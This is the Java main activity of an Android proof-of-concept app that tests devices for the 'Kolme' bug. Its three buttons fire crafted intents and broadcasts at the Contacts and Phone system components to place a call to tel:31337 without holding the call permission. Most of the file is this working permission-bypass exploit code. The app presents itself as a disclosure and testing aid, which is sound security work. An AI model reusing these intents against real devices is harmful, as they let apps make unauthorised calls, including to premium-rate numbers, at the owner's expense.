package com.curesec.android.kolme;

import android.support.v7.app.ActionBarActivity;
import android.text.Html;
import android.text.method.LinkMovementMethod;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends ActionBarActivity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		TextView tv = (TextView) this.findViewById(R.id.textView1);
		tv.setText("Android v"+Build.VERSION.RELEASE+" (SDK "+Build.VERSION.SDK_INT +")");
		
		TextView tv2 = (TextView) this.findViewById(R.id.textView2);
		tv2.setText(Html.fromHtml("To test if your device is vulnerable click a button above. A call will be placed to an invalid number (31337) on success."));
		tv2.setMovementMethod(LinkMovementMethod.getInstance());
		
		Button bsdk15 = (Button) findViewById(R.id.button1);
		Button bsdk16 = (Button) findViewById(R.id.button2);
		Button bsdk17 = (Button) findViewById(R.id.button3);
			
		bsdk15.setOnClickListener(new View.OnClickListener() {
			public void onClick(View view) {
				Toast t = Toast.makeText(getBaseContext(), "Testing call without permissions now!", Toast.LENGTH_SHORT);
				t.show();		
				Intent intent = new Intent();
				intent.setComponent(new ComponentName("com.android.contacts", "com.android.contacts.ContactsListActivity"));
				intent.setAction("android.provider.Contacts.SEARCH_SUGGESTION_DIAL_NUMBER_CLICKED");
				intent.setData(Uri.parse("tel:31337"));
				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				try {
				startActivity(intent);
				}
				catch (SecurityException e) {
					Toast tt = Toast.makeText(getBaseContext(), "Testing call failed, try another SDK target", Toast.LENGTH_SHORT);
					tt.show();					
				}
			}
		}
		);
		
		bsdk16.setOnClickListener(new View.OnClickListener() {
			public void onClick(View view) {
				Toast t = Toast.makeText(getBaseContext(), "Testing call without permissions now!", Toast.LENGTH_SHORT);
				t.show();			
				Intent intent = new Intent();
				intent.setComponent(new ComponentName("com.android.phone","com.android.phone.PhoneApp$NotificationBroadcastReceiver"));
				intent.setAction("com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION");
				intent.setData(Uri.parse("tel:31337"));
				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				getBaseContext().sendBroadcast(intent);
			}
		}
		);
		
		bsdk17.setOnClickListener(new View.OnClickListener() {
			public void onClick(View view) {
				Toast t = Toast.makeText(getBaseContext(), "Testing call without permissions now!", Toast.LENGTH_LONG);
				t.show();
				Intent intent = new Intent();
				intent.setComponent(new ComponentName("com.android.phone","com.android.phone.PhoneGlobals$NotificationBroadcastReceiver"));
				intent.setAction("com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION");
				intent.setData(Uri.parse("tel:31337"));
				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				getBaseContext().sendBroadcast(intent);
				}
		}
		);
		
		Toast t = Toast.makeText(getBaseContext(), "This program is for testing purposes only!\n\nYou can use it to test if you Android device is vulnerable to the Kolme bug.", Toast.LENGTH_LONG);
		t.show();
	
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			 Intent i = new Intent(MainActivity.this, About.class);
             startActivity(i);		
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
}
